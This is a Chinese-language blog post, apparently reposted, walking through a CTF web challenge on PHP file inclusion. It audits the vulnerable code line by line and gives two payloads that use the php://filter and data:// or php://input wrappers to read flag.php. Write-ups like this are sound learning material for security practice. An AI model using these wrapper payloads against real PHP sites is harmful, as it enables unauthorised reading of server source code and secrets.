---
layout: post
title: "CTF-WEB题-"
date: 2025-03-16 13:08:23 +0800
description: "文件包含，php伪协议"
keywords: "CTF WEB题 "
categories: ['Ctf']
tags: ['网络安全']
artid: "146293975"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146293975
    alt: "CTF-WEB题-"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146293975
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146293975
cover: https://bing.ee123.net/img/rand?artid=146293975
image: https://bing.ee123.net/img/rand?artid=146293975
img: https://bing.ee123.net/img/rand?artid=146293975
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     CTF WEB题
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2 id="qBXh0">
     [文件包含,少许难度]
    </h2>
    <blockquote>
     <p>
      地址:
      <a href="https://adworld.xctf.org.cn/challenges/list" rel="nofollow" title="攻防世界">
       攻防世界
      </a>
     </p>
    </blockquote>
    <p id="u352a9b0e">
    </p>
    <p class="img-center">
     <img alt="" height="693" id="u5d156c34" src="https://i-blog.csdnimg.cn/img_convert/18a7198ed6c6ff7bd3d1bac324f77fc1.png" width="1265"/>
    </p>
    <pre><code class="language-php">代码审计

WRONG WAY!
&lt;?php
include("flag.php"); #包含了一个“flag.php”文件
highlight_file(__FILE__); #来显示当前文件的源代码
if(isset($_GET["file1"]) &amp;&amp; isset($_GET["file2"])) #isset()是一个内置函数，用于检查变量是否存在且为非null。 检查是否设置了get参数“file1”和“file2” 且 有值
{
$file1 = $_GET["file1"]; #get传入一个"file1"赋值给$file1
$file2 = $_GET["file2"]; #get传入一个"file2"赋值给$file2
if(!empty($file1) &amp;&amp; !empty($file2)) #检查是否“$file1和$file2” 都不为空
{
if(file_get_contents($file2) === "hello ctf") #(file_get_contents($file2) 是一个内置函数，用于将整个文件的内容读取到一个字符串中的函数调用，file2是一个文件路径。 这里是检查读取file2 文件中的内容 是否和"hello ctf" 完全相等
{
include($file1); # 满足上述条件，才可以执行 include（$file1）,出发文件包含漏洞，“$file1”的文件可以读取 “flag.php” 的内容
}
}
else
die("NONONO"); #否则，输出“NONONO”
}
</code></pre>
    <p>
    </p>
    <blockquote>
     <p>
      详细介绍
     </p>
     <p id="ufdc862b9">
      <code>
       (file_get_contents($file2)
      </code>
      一个内置函数,用来读取文件的内容,$file2 是包含文件路径的变量，file_get_contents 函数会打开该文件，并且将文件的所有内容会作为一个字符串返回，打开失败时，则返回false
     </p>
     <p id="ue1a6b097">
      最后包含file1，我们希望得到flag，获取内容，可以用filter读取
     </p>
     <p id="u1fbcd25e">
      file1和 file2 要存在，且都不为空，file2 的内容为 hello ctf
     </p>
     <p id="u27c41e29">
      因为file2 的内容为 hello ctf 可以用php://input 和data:// 进行绕过
     </p>
    </blockquote>
    <p>
    </p>
    <pre id="RbfMC"><code> payload1：?file1=php://filter/read/convert.base64-encode/resource=flag.php&amp;file2=data://text/plain,hello ctf  
 payload2：?file1=php://filter/read/convert.base64-encode/resource=flag.php&amp;file2=php://input  </code></pre>
    <p id="ud0d4112a">
    </p>
    <p class="img-center">
     <img alt="" height="910" id="u00e6099b" src="https://i-blog.csdnimg.cn/img_convert/cbab4d0c2ea242e1231b82bf8493c276.png" width="2172"/>
    </p>
    <p class="img-center">
     <img alt="" height="904" id="u2e749137" src="https://i-blog.csdnimg.cn/img_convert/640b2e4053f5560f11165a05a8e00894.png" width="1855"/>
    </p>
    <h2>
     总结:
    </h2>
    <p>
     整体来说不难，主要是代码审计，配合文件包含php伪协议即可，多多重复，你也行！
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f68616e6a696e6d696e673131302f:61727469636c652f64657461696c732f313436323933393735" class_="artid" style="display:none">
 </p>
</div>


